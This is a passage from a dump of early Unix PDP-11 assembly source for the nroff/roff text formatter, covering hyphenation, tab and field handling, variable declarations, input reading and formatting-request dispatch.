	br	0b
2:
	cmpb	r0,numc
	bne	1f
	clr	r1
	jsr	pc,setn
	br	0b
1:
	tst	2(sp)
	bne	5f
	bic	$!177,r0
	cmpb	r0,$'(
	bne	1f
	inc	2(sp)
	jsr	pc,get1
	bic	$!177,r0
	cmpb	r0,$'\\
	beq	4b
5:
	mov	r0,-(sp)
	jsr	pc,get1
	bic	$!177,r0
	swab	r0
	bis	(sp)+,r0
1:
	mov	$contab,r1
1:
	mov	(r1)+,(sp)
	bic	$100000,(sp)
	cmp	r0,(sp)
	beq	2f
	cmp	(r1)+,$-1
	bne	1b
	br	3f
2:
	mov	(r1),(sp)
	tst	-(r1)
	bpl	3f
	clr	*nxf
	jsr	pc,pushi
	mov	(sp),ip
3:
	cmp	(sp)+,(sp)+
	rts	pc

copys:
	inc	copyf
	jsr	pc,skipcont
	bne	2f
	jsr	pc,getchar
	bmi	0f
	cmpb	r0,$'"
	bne	0f
1:
	jsr	pc,getchar
	tst	nlflg
	bne	2f
0:
	jsr	pc,wbf
	br	1b
2:
	clr	r0
	jsr	pc,wbt
	clr	copyf
	rts	pc

setrpt:
	inc	copyf
	inc	raw1
	jsr	pc,get1
	dec	copyf
	dec	raw1
	mov	r0,r1
	jsr	pc,get1
	cmpb	r0,$006
	beq	1f
0:
	movb	r0,rchar
	movb	r1,nspace
	cmpb	r1,$377
	bne	1f
	clr	nspace
1:
	rts	pc

setfield:
	clr	npad
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r4,-(sp)
	clr	r4
	clr	-(sp)
	jsr	pc,width
	sub	r1,column /start
	mov	column,-(sp)
	mov	$tabtab,r0
1:
	tst	(r0)
	beq	4f
	cmp	(sp),(r0)+
	bge	1b
	mov	-(r0),2(sp)
	sub	(sp),2(sp) /h
	mov	$fbuf,r2
1:
	jsr	pc,getch1
	bmi	0f
	cmpb	r0,padc
	bne	2f
	jsr	pc,width
	sub	r1,column
	inc	npad
	mov	r2,-(sp)
	add	$2,r2
2:
	cmpb	r0,fc
	beq	3f
	cmpb	r0,$'\n
	bne	0f
	mov	$012,r4
	clr	nlflg
	br	3f
0:
	movb	r0,(r2)+
	cmp	r2,$efbuf-6
	blo	1b
3:
	tst	npad
	bne	0f
	inc	npad
	mov	r2,-(sp)
	add	$3,r2
0:
	movb	r4,(r2)+
	clrb	(r2)+
	jsr	pc,width
	sub	r1,column
	mov	npad,r1
	asl	r1
	add	sp,r1
	mov	(r1),-(sp)
	sub	column,(r1) /-s
	mov	(sp)+,column
	add	2(r1),(r1) /h-s
	mov	(r1),r1
	mov	r1,r2
	sxt	r0
	div	npad,r0
	mov	$014,r3 /unpaddable sp
	tst	r2
	bpl	1f
	neg	r0
	neg	r1
	mov	$010,r3
1:
	mov	(sp)+,r2
	movb	$006,(r2)+
	movb	r0,(r2)+
	movb	r3,(r2)
	tst	r1
	beq	0f
	incb	-1(r2)
	dec	r1
0:
	tstb	-(r2)
	bne	0f
	movb	$377,(r2)
0:
	dec	npad
	bgt	1b
	mov	$fbuf,cp
4:
	cmp	(sp)+,(sp)+
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	pc
-- /usr/source/s7/nroff5.s mode=0110664 uid=3 gid=3 atime=174924237 mtime=174845702 --
/
/

/ hyp1 -- driver

hyphen:
	tst	hypedf
	bne	3f
	tst	hyf
	beq	3f
	inc	hypedf
	mov	wordp,r0
	clr	nhyph
1:
	jsr	pc,punct
	bne	1f
	inc	r0
	br	1b
1:
	jsr	pc,alph
	bne	3f
	mov	r0,wordstart
1:
	inc	r0
	jsr	pc,alph
	beq	1b
	dec	r0
	mov	r0,hstart
1:
	inc	r0
	tstb	(r0)
	beq	2f
	jsr	pc,punct
	bne	3f
	br	1b
2:
	mov	hstart,wordend
	jsr	pc,exword
	beq	0f
	jsr	r5,suffix
	tst	exf
	bne	0f
	jsr	r5,digram
0:
	bit	$4,hyf
	beq	0f
	mov	wordend,r0
	bicb	$!177,-1(r0)
0:
	mov	wordstart,r0
	bicb	$!177,1(r0)
	bit	$10,hyf
	beq	3f
	bicb	$!177,2(r0)
3:
	rts	pc

casehw:
	jsr	pc,skipcont
	bne	2f
	mov	nexth,r1
	cmp	r1,$ehbuf-2
	bhis	3f
1:
	jsr	pc,getchar
	bmi	1f
	cmpb	r0,$' /
	beq	4f
	cmpb	r0,$012
	beq	1f
	movb	r0,(r1)+
	cmp	r1,$ehbuf-2
	blo	1b
	br	3f
1:
	clrb	(r1)+
	mov	r1,nexth
	clrb	(r1)+
2:
	rts	pc
3:
	jsr	r5,string;hmess
	clrb	*nexth
	br	2b
4:
	jsr	pc,1b
	br	casehw
hmess: <Exception word space full.\n\0>
.even

exword:
	clr	exf
	clr	-(sp)
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r4,-(sp)
	mov	$hbuf,r2
	mov	hstart,r0
	cmpb	(r0)+,(r0)+
0:
	mov	r2,8(sp)
	mov	wordstart,r1
	tstb	(r2)
	beq	4f
1:
	movb	(r2)+,r4
	cmpb	r4,$'-
	beq	1b
	movb	(r1)+,r3
/	tstb	r3
/	bne	2f
	cmp	r1,r0
	blo	2f
	tstb	r4
	beq	3f
2:
	tstb	r4
	bne	2f
/	tstb	(r1)
	tstb	-1(r0)
	bne	2f
	cmpb	r3,$'s
	beq	3f
2:
	tstb	r4
	beq	0b
/	tstb	r3
/	beq	2f
	cmp	r1,r0
	bhis	2f
	cmpb	r4,r3
	beq	1b
2:
	tstb	(r2)+
	bne	2b
	br	0b
3:
	mov	wordstart,r1
	mov	8(sp),r2
	clr	8(sp)
	inc	exf
1:
	tstb	(r1)+
	cmpb	(r2)+,$'-
	bne	0f
	bisb	$200,-1(r1)
	tstb	(r2)+
0:
	tstb	(r2)
	bne	1b
4:
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	tst	(sp)+
	rts	pc

punct:
	tst	old
	bne 4f
	cmpb	(r0),$010
	beq	0f
	movb	(r0),r2
	jsr	pc,alph2
	beq	0f
	sez
	rts	 pc
0:
	clz
	rts	pc
4:
	mov	 $3f,r2
1:
	cmpb	(r0),(r2)+
	beq	2f
	tstb	(r2)
	bne	1b
	clz
2:
	rts	pc
3: < .,()"\'`\0>	/should be more
.even
maplow:
	cmp	r2,$'a
	bhis	1f
	add	$'a-'A,r2
1:
	rts	pc

vowel:
	cmpb	r2,$'a
	beq	1f
	cmpb	r2,$'e
	beq	1f
	cmpb	r2,$'i
	beq	1f
	cmpb	r2,$'o
	beq	1f
	cmpb	r2,$'u
	beq	1f
	cmpb	r2,$'y
	beq	1f
	cmpb	r2,$'A
	beq	1f
	cmpb	r2,$'E
	beq	1f
	cmpb	r2,$'I
	beq	1f
	cmpb	r2,$'O
	beq	1f
	cmpb	r2,$'U
	beq	1f
	cmpb	r2,$'Y
1:
	rts	pc

checkvow:
	mov	r0,-(sp)
1:
	movb	-(r0),r2
	jsr	pc,vowel
	beq	1f
	jsr	pc,alph
	beq	1b
	mov	(sp)+,r0
	clz
	rts	r5
1:
	mov	(sp)+,r0
	sez
	rts	r5

/ hyp2 -- suffix and digram

digram:
	mov	hstart,r0
1:
	jsr	pc,alph
	bne	3f
	jsr	pc,vowel
	beq	1f
	dec	r0
	br	1b
1:
	mov	r0,hstart
1:
	movb	-(r0),r2
	jsr	pc,alph2
	bne	3f
	jsr	pc,vowel
	bne	1b
	clr	maxdig
	mov	r0,nhstart
1:
	mov	$1,r3
	movb	-1(r0),r2
	jsr	pc,alph2
	beq	2f
	movb	(r0),r2
	mov	$'a,r1
	jsr	r5,dilook; bxh
	br	4f
2:
	movb	-2(r0),r2
	mov	$xxh,0f
	jsr	pc,alph2
	beq	2f
	mov	$bxxh,0f
2:
	movb	-1(r0),r1
	movb	(r0),r2
	jmp	7f
.data
7:
	jsr	r5,dilook; 0:xxh
	jmp	8f
.text
8:
4:
	movb	(r0)+,r1
	movb	(r0),r2
	jsr	r5,dilook; xhx
	movb	(r0),r1
	movb	1(r0),r2
	jsr	r5,dilook; hxx
	cmp	r3,maxdig
	blos	2f
	mov	r3,maxdig
	mov	r0,maxloc
2:
	cmp	r0,hstart
	blo	1b
	mov	nhstart,hstart
	cmp	maxdig,thresh
	blo	digram
	bisb	$200,*maxloc
	inc	nhyph
/	mov	maxdig,*octbufp
/	inc	octcnt
/	add	$2,octbufp
	br	digram
3:
	rts	r5

dilook:
	mov	r4,-(sp)
	bic	$!177,r2
	bic	$!177,r1
	jsr	pc,maplow
	sub	$'a,r2
	cmp	r2,$'z-'a
	bhi	3f
	mov	r2,r4
	mov	r1,r2
	jsr	pc,maplow
	sub	$'a,r2
	cmp	r2,$'z-'a
	bhi	3f
	mov	r3,-(sp)
	mov	r2,r3
	mpy	$13.,r3
	clr	r2
	clc
	ror	r4
	adc	r2
	add	r3,r4
	add	(r5)+,r4
	movb	(r4),r4
	tst	r2
	bne	1f
	asr	r4
	asr	r4
	asr	r4
	asr	r4
1:
	bic	$!17,r4
	mov	r4,r3
	mpy	(sp)+,r3
	br	4f
3:
	clr	r3
	tst	(r5)+
4:
	mov	(sp)+,r4
	rts	r5

suffix:
	mov	hstart,r0
	jsr	pc,alph
	bne	4f
	jsr	pc,maplow
	sub	$'a,r2
	asl	r2
	mov	suftab(r2),-(sp)
	bic	$!37777,(sp)
	beq	3f
1:
	mov	hstart,r0
	mov	(sp),r1
	jsr	pc,rdsuf
	movb	(r1),r3
	beq	3f
	bic	$!17,r3
	add	r3,(sp)
	add	r1,r3
2:
	movb	-(r3),r2
	cmp	r3,r1
	ble	2f
	bic	$!177,r2
	mov	r2,-(sp)
	movb	-(r0),r2
	jsr	pc,maplow
	cmp	r2,(sp)+
	bne	1b
	br	2b
2:
	mov	hstart,r0
	tst	(sp)+
	movb	(r1),r3
	bic	$!17,r3
	add	r1,r3
	bitb	$200,(r1)+
	bne	1f
2:
	dec	r0
	cmp	r3,r1
	ble	2f
	tstb	-(r3)
	bpl	2b
1:
	mov	r0,hstart
	dec	hstart
	bitb	$100,-1(r1)
	bne	2b
	jsr	r5,checkvow
	bne	4f
	bisb	$200,(r0)
	br	2b
2:
	bitb	$40,-(r1)
	bne	4f
	jsr	pc,exword
	bne	suffix
	br	4f
/	beq	suffix
/	br	4f
3:
	tst	(sp)+
4:
	rts	r5

rdsuf:
	mov	r0,-(sp)
	mov	suff,nfile
	mov	4(sp),r1
	jsr	pc,rdsufb
	mov	$sufb,r2
	movb	r0,(r2)+
	mov	r0,r3
	bic	$!17,r3
1:
	dec	r3
	blt	1f
	inc	r1
	jsr	pc,rdsufb
	movb	r0,(r2)+
	br	1b
1:
	mov	$sufb,r1
	mov	(sp)+,r0
	rts	pc
-- /usr/source/s7/nroff8.s mode=0100664 uid=3 gid=3 atime=174924238 mtime=174845705 --
/
/

/ nroff8

.data
nexth: hbuf
outid: 1
init: 1
slow:	1
nflush: 0
nev: 2
ev:	0
nextb:	.=.+2
evp: elist
pto:	9999.
po:	0
po1:	0
npn:	0
pl:	66.
obufp:	obuf
wbufp:	wbuf
thresh:	240
suffil:
	</usr/lib/suftab\0>
ones:
	<ixcm>
fives:
	<vld>
cones:	<IXCM>
cfives:	<VLD>
ttyx:	</dev/tty0\0>
tmfile:	<nr.out\0>
bfn:
	</tmp/>
bfn1: <rtma\0>
/indf: <index\0>
	.even
ttyid:	0
ttyod:	2
ilistp:
frame:	stk
nxf:	stk+12.
dolc:	020
tch:	024
ifp:	ifl
namesiz = 88.
bname:
nextf: </usr/lib/tmac.>
nextf1:	.=nextf+namesiz
ename:	.=.+2
fc:	004

block:	/environment block
totout:	.=.+2
ls:	1
ls1:	1
ll:	65.
ll1:	65.
llh:	65.
llh1:	65.
ad:	1
nms:	1
ndf:	1
fi:	1
cc:	'.
c2:	''
ohc:	200
hyf:	1
hypedf:	0
un1:	-1
tabc:	014
dotc:	'.
numc:	034
tabtab:	8.;16.;24.;32.;40.;48.;56.;64.;72.
	80.;88.;96.;104.;112.;120.;128.;136.;144.;152.;160.
	.=.+44.
	.even
etabtab:
fac:	.=.+2
fmq:	.=.+2
ne:	.=.+2
nel:	.=.+2
lastl: 0
jfomod:	.=.+2
wordp:	.=.+2
spaceflg: .=.+2
linep:	.=.+2
wordend:	.=.+2
wordstart: .=.+2
wne:	.=.+2
nc:	.=.+2
nb:	.=.+2
lnumber:	.=.+2
numbmod:	.=.+2
nwd:	.=.+2
nn:	.=.+2
ni:	.=.+2
ul:	.=.+2
ce:	.=.+2
rchar: .=.+2
nspace:	.=.+2
in:	.=.+2
in1:	.=.+2
un:	.=.+2
wch:	.=.+2
x:	.=.+2
/pendb:	.=.+2
pendt:	.=.+2
pendw:	.=.+2
spread:	.=.+2
word:	.=.+200.
eword:	.=.+2
stbuf:
linsiz = 600.
line:	.=.+linsiz
blockend: .=.+2
dummy: .=block+1024.

.bss
bss:
hnl: .=.+2
iline: .=.+2
exf: .=.+2
hbuf: .=.+128.
ehbuf:
ndone: .=.+2
ttys:	.=.+4
ttym:	.=.+2
nform:	.=.+2
toolate: .=.+2
pipin: .=.+2
npad:	.=.+2
padc:	.=.+2
fbuf:	.=.+252.
efbuf:	.=.+4
em:	.=.+2
old:	.=.+2
raw:	.=.+2
raw1: .=.+2
xpc:	.=.+2
copyf:	.=.+2
aplnk:	.=.+2
apptr:	.=.+2
app:	.=.+2
blist:	.=.+512.
eblist:	.=.+2
diflg:	.=.+2
ditf:	.=.+2
first:	.=.+2
macerr:	.=.+2
numerr: .=.+2
newptr:	.=.+2
oldptr:	.=.+2
rbuf:	.=.+256.
wbuf:	.=.+256.
wbufe:	.=.+2
mflg:	.=.+2
iflg:	.=.+2
pendnf:	.=.+2
over:	.=.+2
temp:	.=.+2
nfo:	.=.+2
ds:	.=.+2
markline:	.=.+2
litlev:	.=.+2
lit:	.=.+2
ioff:	.=.+2
ifl:	.=.+8.
ifle:	.=.+2
offl:	.=.+10.
noset:	.=.+2
quote:	.=.+2
x.5:	.=.+2
/index:	.=.+2
stdi:	.=.+2
/indid:	.=.+2
sv:	.=.+2
tty:	.=.+2
quiet:	.=.+2
trap:	.=.+2
nls:	.=.+2
elist: .=.+18.
eliste: .=.+2
rlist:	.=.+158.
rliste:	.=.+2
vlist:
pn:	.=.+2
nl:	.=.+2
dnl:	.=.+2
yr:	.=.+2
mo:	.=.+2
dy:	.=.+2
dw:	.=.+2
column:	.=.+2
	.=.+144.
inclist:	.=.+160.
flist:	.=.+160.
nlist:	.=.+28.
nliste:	.=.+2
mlist:	.=.+28.
mliste:	.=.+2
donef:	.=.+2
ssp:	.=.+2
stop:	.=.+2
nx:	.=.+2
ibf:	.=.+2
ibf1:	.=.+2
skp:	.=.+2
ejf:	.=.+2
/ejf1:	.=.+2
ejl:	.=.+2
ip:	.=.+2
cp:	.=.+2
ap:	.=.+2
op:	.=.+2
tflg:	.=.+2
ocol:	.=.+2
nlflg:	.=.+2
ch:	.=.+2
maxdig:	.=.+2
maxloc:	.=.+2
hstart:	.=.+2
nhstart: .=.+2
nhyph:	.=.+2
argc:	.=.+2
argp:	.=.+2
ibufp:	.=.+2
xbufp:	.=.+2
xbuf:	.=.+514.
eibuf:	.=.+2
xeibuf:	.=.+2
ulstate:	.=.+2
ulc:	.=.+2
bsc:	.=.+2
nsp:	.=.+2
ro:	.=.+2
pfrom:	.=.+2
onesp:	.=.+2
fivesp:	.=.+2
suff:	.=.+2
sufb:	.=.+20.
sufbuf:	.=.+128.
suftab:	.=2*26.+.
ifile:	.=.+2
char:	.=.+2
nfile:	.=.+2
headp:	.=.+2
trtab:	.=.+128.
blocksize:	.=.+2
enda:	.=.+2
ybuf:
cbuf: .=.+34.
ilist:
stk:	.=.+60.
end:
-- /usr/source/s7/roff1.s mode=0110664 uid=3 gid=3 atime=174924218 mtime=174845711 --
/
/

/ roff1 -- text formatter

	.globl ttyn
	nop = 000240
	signal = 48.

ibuf: /init code in ibuf+obuf
	cmp	sp,$end
	bhi	1f
	jsr	r5,string; emes1
	sys	exit
1:
	clr	r0
	jsr	pc,mesg
	sys	signal; 1; place
	sys	signal; 2; place
	jsr	pc,makebf
	sys	open; suffil; 0
	bes	1f
	mov	r0,suff
	sys	seek; 20; 0
	bes	1f
	mov	suff,r0
	sys	read; suftab; 2*26.
1:
	clr	r0
	mov	(sp)+,argc
	dec	argc
	bne	1f
	jmp	place
1:
	tst	(sp)+
	mov	(sp),r4
	cmpb	(r4)+,$'+
	bne	2f
	jsr	r5,pnum; pfrom
	br	3f
2:
	cmpb	-1(r4),$'-
	bne	2f
	cmpb	(r4),$'s
	bne	0f
	inc	stop
	br	3f
0:
	cmpb	(r4),$'h
	bne	0f
	clr	slow
	br	3f
0:
	jsr	r5,pnum; pto
3:
	dec	argc
	bgt	1b
2:
	mov	$nop,get1a
	mov	$ibuf,ibufp
	mov	$ibuf,eibuf
	mov	sp,argp
	jsr	pc,topbot
	clr	r0
1:
	movb	r0,trtab(r0)
	inc	r0
	cmp	r0,$128.
	bne	1b
	jsr	pc,rbreak
	jsr	pc,istop
	jmp	loop
makebf:
	sys	stat; bfn; stbuf
	bec	2f
	sys	creat; bfn; 400
	bec	1f
2:
	incb	bfn+8
	cmpb	bfn+8,$'z
	blos	makebf
	jmp	place
1:
	mov	r0,ibf
	sys	write; sufbuf;128.
	sys	open; bfn;0
	mov	r0,ibf1
	rts	pc

string:
	mov	(r5)+,r1
	mov	r1,r2
	mov	r1,0f
1:
	tstb	(r1)+
	bne	1b
	sub	r2,r1
	mov	r1,1f
	mov	$1,r0
	sys	write; 0:..; 1:..
	rts	r5

emes1: <Too many files.\n\0>
xxx:
.even
obuf=ibuf+512.
.=ibuf+1024.
loop:
	clr	nlflg
	jsr	pc,getchar
	cmpb	r0,cc
	beq	2f
	movb	r0,ch
	jsr	pc,text
	br	loop
2:
	jsr	pc,control
	jsr	pc,flushi
	br	loop

mesg:
	tst	r0
	bne	setsame
	jsr	pc,ttyn
	movb	r0,ttyx+8.
	sys	stat; ttyx; stbuf
	mov	stbuf+4,0f
	mov	0f,1f
	bic	$22,0f
	sys	chmod; ttyx; 0:..
	rts	pc
setsame:
	sys	chmod; ttyx; 1:..
	rts	pc

pnum:
	mov	r4,ibufp
	mov	$37777,eibuf
	jsr	r5,number1; 0
	mov	r0,*(r5)+
	clr	ch
	rts	r5

flushi:
	clr	ch
	tst	nlflg
	bne	1f
	jsr	pc,getchar
	br	flushi
1:
	rts	pc

gettchar:
	tst	ul
	ble	getchar
	tst	ulstate
	beq	3f
	tst	bsc
	bgt	1f
	tst	ulc
	bgt	2f
	clr	ulstate
	br	3f
1:
	dec	bsc
	mov	$010,r0
	rts	pc
2:
	dec	ulc
	mov	$'_,r0
	rts	pc
3:
	jsr	pc,getchar
	cmp	r0,$'0
	blt	1f
	cmp	r0,$'9
	ble	2f
	cmp	r0,$'A
	blt	1f
	cmp	r0,$'Z
	ble	2f
	cmp	r0,$'a
	blt	1f
	cmp	r0,$'z
	ble	2f
1:
	tst	ulc
	bgt	3f
	rts	pc
3:
	mov	$1,ulstate
	mov	r0,ch
	br	gettchar
2:
	inc	bsc
	inc	ulc
	rts	pc

getchar:
	mov	ch,r0
	beq	1f
	clr	ch
	rts	pc
1:
	tst	nlflg
	beq	1f
	mov	$'\n,r0
	rts	pc
1:
	jsr	pc,get1
	cmp	r0,$'\\
	bne	2f
	jsr	pc,get1
	jsr	r5,switch; esctab
	br	3f
2:
	cmp	r0,$033  /prefix
	bne	3f
	jsr	pc,get1
	jsr	r5,switch; pfxtab
3:
	cmp	r0,$'\n
	bne	3f
	inc	nlflg
	clr	column
3:
	mov	r1,-(sp)
	jsr	pc,width
	add	r1,column
	mov	(sp)+,r1
	rts	pc

esctab:
   .byte 'd, 032  /hlf (down)
   .byte 'u, 035  /hlr (up)
   .byte 'r, 036  /flr (reverse)
   .byte 'x, 016  /SO (extra chars)
   .byte 'y, 017  /SI (normal characters)
   .byte 'l, 0177 /delete
   .byte 't, 011  /hor tab
   .byte 'a, 0100 /at sign
   .byte 'n, 043  /number sign
   .byte '\\, 134 /backslash
   .byte 0, 0

pfxtab:
   .byte '7, 036  /flr
   .byte '8, 035  /hlr
   .byte '9, 032  /hlf
   .byte '4, 030  /brs
   .byte '3, 031  /rrs
   .byte '1, 026  /set hor tabs
   .byte '2, 027  /clr hor tabs
   .byte 0,0
pfxtab1:

switch:
	mov	r1,-(sp)
	mov	(r5)+,r1
1:
	cmpb	(r1)+,r0
	beq	1f
	tstb	(r1)+
	bne	1b
	cmp	r1,$pfxtab
	ble	0f
	cmp	r1,$pfxtab1
	bgt	0f
	mov	$037,r0
0:
	mov	(sp)+,r1
	rts	r5
1:
	movb	(r1)+,r0
	mov	(sp)+,r1
	rts	r5

get1:
	tst	nspace
	ble	1f
	dec	nspace
	mov	tabc,r0
	rts	pc
1:
	mov	r1,-(sp)
4:
	tst	ip
	beq	5f
	jsr	pc,rbf
	br	6f
5:
	tst	nx
	bne	0f
	mov	ibufp,r1
	cmp	r1,eibuf
	bne	3f
0:
	mov	ifile,r0
	bne	2f
1:
	jsr	pc,nextfile
2:
	clr	nx
	sys	read; ibuf; 512.
	bes	done
	tst	r0
	beq	1b
	mov	$ibuf,r1
	add	r1,r0
	mov	r0,eibuf
3:
	movb	(r1)+,r0
	mov	r1,ibufp
1:
	cmp	r0,$011	/tab
	bne	6f
	mov	(sp)+,r1
	mov	$tabtab,r0
	inc	nspace
1:
	tstb	(r0)
	beq	get1
	cmpb	column,(r0)+
	bge	1b
	movb	-(r0),nspace
	sub	column,nspace
	br	get1
6:
get1a:	br	7f
	tst	r0
	beq	4b
7:
	mov	(sp)+,r1
	rts	pc

nextfile:
	mov	ifile,r0
	beq	1f
	sys	close
1:
	tst	nx
	beq	2f
	mov	$nextf,0f
	br	3f
2:
	dec	argc
	blt	done
	mov	*argp,0f
	add	$2,argp
3:
	sys	open; 0:..; 0
	bes	done
	mov	r0,ifile
	rts	pc

done:
	jsr	pc,rbreak
	jsr	pc,eject
	jsr	pc,flush
place:
	sys	signal; 2; 1
	mov	$1,r0
	jsr	pc,mesg
	sys	unlink; bfn
	sys	exit

	rts	pc

putchar:
	cmp	pn,pfrom
	blt	2f
	clr	pfrom
	bic	$!177,r0
	beq	2f
	movb	trtab(r0),r0
	cmp	r0,$' 
	bne	1f
	inc	nsp
2:
	rts	pc
1:
	cmp	r0,$'\n
	bne	1f
	clr	nsp
	clr	ocol
	br	2f
1:
	tst	nsp
	beq	2f
	tst	slow
	bne	4f
	jsr	pc,dsp
	cmp	nsp,r1
	blt	4f
	mov	$011,3f+2
	cmp	r1,$1
	bgt	8f
	mov	$040,3f+2
	dec	nsp
	br	9f
8:
	sub	r1,nsp
9:
	mov	r0,-(sp)
3:
	mov	$011,r0
	jsr	pc,pchar1
	mov	(sp)+,r0
	br	1b
4:
	mov	r0,-(sp)
	mov	$' ,r0
	jsr	pc,pchar1
	mov	(sp)+,r0
	dec	nsp
	bne	4b
2:
	cmp	r0,$026
	blt	2f
	cmp	r0,$037
	beq	3f
	bgt	2f
	mov	r0,-(sp)
	jsr	r5, switch; unpfx
	cmp	(sp)+,r0
	beq	2f
	mov	r0,-(sp)
	mov	$033,r0  /prefix
	jsr	pc,pchar1
	dec	ocol
	mov	(sp)+,r0
2:
pchar1:
	cmp	r0,$011
	bne	1f
	jsr	pc,dsp
	br	2f
1:
	jsr	pc,width
2:
	add	r1,ocol
	movb	r0,*obufp
	inc	obufp
	cmp	obufp,$obuf+128.
	beq	flush
3:
	rts	pc

dsp:
	clr	r1
1:
	add	$8.,r1
	cmp	ocol,r1
	bgt	1b
	sub	ocol,r1
	bne	2f
	mov	$8.,r1
2:
	rts	pc


unpfx:
   .byte 032, '9
   .byte 035, '8
   .byte 036, '7
   .byte 031, '3
   .byte 030, '4
   .byte 026, '1
   .byte 027, '2
   .byte 0,0

flush:
	mov	obufp,r0
	sub	$obuf,r0
	mov	r0,0f
	mov	$1,r0
	sys	write; obuf; 0:0
	mov	$obuf,obufp
	rts	pc

control:
	jsr	pc,getchar
	mov	r0,-(sp)
	jsr	pc,getchar
	swab	r0
	bis	(sp),r0
	mov	$contab,r1
1:
	mov	(r1)+,(sp)
	bic	$100000,(sp)
	cmp	r0,(sp)
	bne	4f
	mov	(r1),(sp)
	tst	-(r1)
	bpl	3f
	jsr	pc,flushi
	cmp	ilistp,$iliste
	bgt	5f
	mov	ip,*ilistp
	add	$2,ilistp
	mov	(sp),ip
	br	5f
3:
	jmp	*(sp)+
4:
	cmp	(r1)+,$-1
	bne	1b
5:
	tst	(sp)+
	rts	pc

contab:
   <ad>; casead
   <bp>; casebp
   <br>; casebr
   <cc>; casecc
   <ce>; casece
   <ds>; caseds
   <fi>; casefi
   <in>; casein
   <ix>; caseix
   <li>; caseli
   <ll>; casell
   <ls>; casels
   <na>; casena
   <ne>; casene
   <nf>; casenf
   <pa>; casepa
   <bl>; casebl
   <pl>; casepl
   <sk>; casesk
   <sp>; casesp
   <ss>; casess
   <ta>; caseta
   <ti>; caseti
   <tr>; casetr
   <ul>; caseul
   <un>; caseun
   <he>; casehe
   <hx>; casehx
   <fo>; casefo
   <eh>; caseeh
   <oh>; caseoh
   <ef>; caseef
   <of>; caseof
   <m1>; casem1
   <m2>; casem2
   <m3>; casem3
   <m4>; casem4
   <hc>; casehc
   <hy>; casehy
   <n1>; casen1
   <n2>; casen2
   <nn>; casenn
   <ni>; caseni
   <jo>; casejo
   <ar>; casear
   <ro>; casero
   <nx>; casenx
   <po>; casepo
   <de>; casede
   <ig>; caseig
   <tc>; casetc
   <mk>; casemk
bnames: .=.+100.
    -1; -1
-- /usr/source/s7/roff2.s mode=0100664 uid=3 gid=3 atime=174924218 mtime=174845715 --
/
/

/ roff2 -- runoff

casead:
	jsr	pc,rbreak
	inc	ad
	rts	pc

	rts	pc

casebr:
	jsr	pc,rbreak
	rts	pc

casecc:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	beq	1f
	movb	r0,cc
1:
	mov	r0,ch
	rts	pc

casece:
	jsr	pc,rbreak
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,ce
	jsr	pc,need
	rts	pc

caseds:
	jsr	pc,rbreak
	mov	$2,ls
	rts	pc

casefi:
	jsr	pc,rbreak
	inc	fi
	rts	pc

casein:
	jsr	pc,rbreak
	jsr	r5,number; in
	jsr	pc,min
	mov	r0,in
	mov	r0,un
	rts	pc

caseix:
	jsr	r5,number; in
	jsr	pc,min
	mov	r0,in
	rts	pc

caseli:
	jsr	r5,number; 0
	mov	r0,-(sp)
1:
	dec	(sp)
	blt	1f
	jsr	pc,flushi
	clr	nlflg
	jsr	pc,text
	br	1b
1:
	tst	(sp)+
	rts	pc

casell:
	jsr	r5,number; ll
	jsr	pc,min
	mov	r0,ll
	rts	pc

casels:
	jsr	pc,rbreak
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	1f
	mov	ls1,ls
	rts	pc
1:
	mov	r0,ch
	jsr	r5,number1; ls
	dec	r0
	jsr	pc,min
	inc	r0
	mov	r0,ls
	mov	r0,ls1
	rts	pc

casena:
	jsr	pc,rbreak
	clr	ad
	rts	pc

casene:
	jsr	r5,number; 0
	jsr	pc,min
	jsr	pc,need
	rts	pc

casenf:
	jsr	pc,rbreak
	clr	fi
	rts	pc

casepa:
casebp:
	jsr	pc,rbreak
	jsr	pc,eject
	jsr	pc,skipcont
	tst	nlflg
	bne	1f
	jsr	r5,number; pn
	jsr	pc,min
	mov	r0,pn
1:
	rts	pc

casebl:
	jsr	pc,rbreak
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,-(sp)
	jsr	pc,need2
1:
	dec	(sp)
	blt	1f
	mov	$' ,r0
	jsr	pc,storeline
	jsr	pc,rbreak
	br	1b
1:
	tst	(sp)+
	rts	pc

casepl:
	jsr	r5,number; pl
	mov	r0,pl
	jsr	pc,topbot
	rts	pc

casesk:
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,skip
	rts	pc

casesp:
	jsr	pc,rbreak
	jsr	r5,number; 0
	jsr	r5,nlines; nline
	rts	pc

casess:
	jsr	pc,rbreak
	mov	$1,ls
	rts	pc

casetr:
	jsr	pc,skipcont
1:
	jsr	pc,getchar
	cmp	r0,$'\n
	beq	1f
	mov	r0,r1
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	2f
	mov	$' ,r0
2:
	movb	r0,trtab(r1)
	br	1b
1:
	rts	pc

caseta:
	mov	$tabtab,r1
1:
	jsr	r5,number; 0
	jsr	pc,min
	dec	r0
	ble	1f
	movb	r0,(r1)+
	br	1b
1:
	clrb	(r1)+
	rts	pc

caseti:
	jsr	pc,rbreak
	jsr	r5,number; in
	jsr	pc,min
	mov	r0,un
	rts	pc

caseul:
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,ul
	rts	pc

caseun:
	jsr	r5,number; 0
	sub	in,r0
	neg	r0
	jsr	pc,min
	mov	r0,un
	rts	pc

casehx:
	tst	hx
	beq	1f
	clr	hx
	br	2f
1:
	inc	hx
2:
	jsr	pc,topbot
	rts	pc

casehe:
	jsr	r5,headin; ehead
	mov	ehead,ohead
	rts	pc
casefo:
	jsr	r5,headin; efoot
	mov	efoot,ofoot
	rts	pc

caseeh:
	jsr	r5,headin; ehead
	rts	pc

caseoh:
	jsr	r5,headin; ohead
	rts	pc

caseef:
	jsr	r5,headin; efoot
	rts	pc

caseof:
	jsr	r5,headin; ofoot
	rts	pc

casem1:
	jsr	r5,number; ma1
	jsr	pc,min
	mov	r0,ma1
	br	1f

casem2:
	jsr	r5,number; ma2
	jsr	pc,min
